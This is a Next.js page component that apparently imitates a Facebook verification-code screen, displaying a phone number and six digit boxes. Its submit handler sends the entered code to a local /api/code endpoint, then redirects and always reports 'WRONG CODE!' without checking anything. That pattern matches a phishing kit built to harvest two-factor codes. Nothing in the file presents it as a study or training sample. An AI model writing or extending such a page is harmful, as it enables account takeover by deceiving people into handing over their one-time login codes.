"use client";

import { useRouter } from "next/navigation";
import { useRef, useState } from "react";

export default function Code() {
  const [values, setValues] = useState(["", "", "", "", "", ""]);
  const inputsRef = useRef([]);
  const router = useRouter();

  const handleChange = (i, val) => {
    if (!/^\d?$/.test(val)) return; // зөвхөн 1 цифр л зөвшөөрнө
    const copy = [...values];
    copy[i] = val;
    setValues(copy);
    if (val && i < 5) inputsRef.current[i + 1]?.focus();
  };

  const handleKeyDown = (i, e) => {
    if (e.key === "Backspace" && !values[i] && i > 0) {
      inputsRef.current[i - 1]?.focus();
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const code = values.join("");
    if (code.length !== 6) {
      alert("6 оронтой кодоо бүрэн оруулна уу");
      return;
    }

    await fetch("/api/code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code }), // зөвхөн код
    });
    router.push("/code2");
    alert("WRONG CODE!");
  };

  return (
    <form
      onSubmit={handleSubmit}
      style={{ marginTop: 100, textAlign: "center" }}
    >
      <div className="fb-container">
        <div className="fb-logo"></div>
        <div style={{ marginBottom: 20, textAlign: "center" }}>
          We sent your code to: +97680750325
        </div>
        <div style={{ display: "flex", gap: 12, justifyContent: "center" }}>
          {values.map((v, i) => (
            <input
              key={i}
              ref={(el) => (inputsRef.current[i] = el)}
              maxLength={1}
              inputMode="numeric"
              value={v}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              style={{
                width: 48,
                height: 58,
                fontSize: 26,
                textAlign: "center",
                borderRadius: 8,
                border: "2px solid #ccc",
              }}
            />
          ))}
        </div>

        <button className="fb-login-btn2">Submit</button>
      </div>
    </form>
  );
}
